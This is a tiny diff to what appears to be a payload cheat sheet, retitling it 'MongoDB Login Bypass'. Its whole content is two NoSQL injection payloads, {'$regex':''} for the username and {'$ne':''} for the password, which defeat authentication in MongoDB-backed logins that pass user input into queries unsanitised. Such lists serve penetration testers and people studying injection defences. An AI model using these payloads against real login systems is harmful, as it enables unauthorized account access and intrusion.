@@ -1,4 +1,4 @@
-#MongoDB
+#MongoDB Login Bypass
 
 {"$regex":""} >> For username
 {"$ne":""} >> For password
